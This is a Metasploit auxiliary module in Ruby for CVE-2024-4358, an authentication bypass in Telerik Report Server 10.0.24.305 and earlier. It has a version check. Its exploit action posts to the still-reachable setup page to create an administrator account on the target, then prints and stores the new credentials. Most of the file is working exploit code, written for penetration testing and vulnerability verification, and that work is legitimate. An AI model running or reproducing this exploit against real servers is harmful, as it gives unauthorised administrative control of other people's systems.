# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework

class MetasploitModule < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Telerik Report Server Auth Bypass',
        'Description' => %q{
          This module exploits an authentication bypass vulnerability in Telerik Report Server versions 10.0.24.305 and
          prior which allows an unauthenticated attacker to create a new account with administrative privileges. The
          vulnerability leverages the initial setup page which is still accessible once the setup process has completed.

          If either USERNAME or PASSWORD are not specified, then a random value will be selected. The module will fail if
          the specified USERNAME already exists.
        },
        'Author' => [
          'SinSinology', # CVE-2024-4358 discovery, original PoC and vulnerability write-up
          'Spencer McIntyre' # MSF module
        ],
        'License' => MSF_LICENSE,
        'References' => [
          [ 'CVE', '2024-4358' ], # Authentication bypass # patched in > 10.0.24.305
          [ 'URL', 'https://summoning.team/blog/progress-report-server-rce-cve-2024-4358-cve-2024-1800/' ]
        ],
        'DefaultOptions' => {
          'SSL' => false,
          'RPORT' => 83
        },
        'DisclosureDate' => '2024-06-04',
        'Notes' => {
          'Stability' => [ CRASH_SAFE, ],
          'SideEffects' => [ IOC_IN_LOGS, ],
          'Reliability' => [ ]
        },
        'Actions' => [
          [ 'CHECK', { 'Description' => 'Check for the vulnerability' } ],
          [ 'EXPLOIT', { 'Description' => 'Exploit the vulnerability' } ]
        ],
        'DefaultAction' => 'EXPLOIT'
      )
    )

    register_options([
      OptString.new('TARGETURI', [ true, 'The base path to the web application', '/' ]),
      OptString.new('USERNAME', [false, 'Username for the new account', '']),
      OptString.new('PASSWORD', [false, 'Password for the new account', ''])
    ])
  end

  def username
    @username ||= datastore['USERNAME'].blank? ? Faker::Internet.username : datastore['USERNAME']
  end

  def password
    @password ||= datastore['PASSWORD'].blank? ? Rex::Text.rand_text_alphanumeric(16) : datastore['PASSWORD']
  end

  def create_account
    # create a new account by exploiting CVE-2024-4358
    res = send_request_cgi(
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, 'Startup/Register'),
      'vars_post' => {
        'Username' => username,
        'Password' => password,
        'ConfirmPassword' => password,
        'Email' => Faker::Internet.email(name: username),
        'FirstName' => Faker::Name.first_name,
        'LastName' => Faker::Name.last_name
      }
    )
    fail_with(Failure::Unreachable, 'No response received') if res.nil?
    fail_with(Failure::UnexpectedReply, 'Failed to create the new account') unless res.code == 302 && res.headers['location']&.end_with?('/Report/Index')
  end

  def report_creds(user, pass)
    credential_data = {
      module_fullname: fullname,
      username: user,
      private_data: pass,
      private_type: :password,
      workspace_id: myworkspace_id,
      status: Metasploit::Model::Login::Status::UNTRIED
    }.merge(service_details)

    create_credential_and_login(credential_data)
  end

  def action_check
    res = send_request_cgi('uri' => normalize_uri(target_uri.path, 'Account/Login'))
    return Exploit::CheckCode::Unknown unless res
    return Exploit::CheckCode::Safe unless res.code == 200

    html_doc = res.get_html_document
    return Exploit::CheckCode::Safe unless html_doc&.xpath('//head/title')&.text&.end_with?('Telerik Report Server')
    return Exploit::CheckCode::Detected unless html_doc&.xpath('//head/script')&.text =~ /['"](?<key>dimension2|version)['"]:\s*['"](?<version>(?<d1>\d+\.)+(?<d2>\d+))['"]/

    version = Rex::Version.new(Regexp.last_match('version'))
    details = { version: version }
    vprint_status("Detected Telerik Report Server version: #{version}.")

    if version > Rex::Version.new('10.0.24.305')
      return Exploit::CheckCode::Safe("Telerik Report Server #{version} is not affected by CVE-2024-4358.", details: details)
    end

    Exploit::CheckCode::Vulnerable("Telerik Report Server #{version} is affected.", details: details)
  end

  alias check action_check

  def action_exploit
    print_status('Creating a new administrator account using CVE-2024-4358')
    create_account
    print_good("Created account: #{username}:#{password}")
    report_creds(username, password)
  end

  def run
    send("action_#{action.name.downcase}")
  end
end
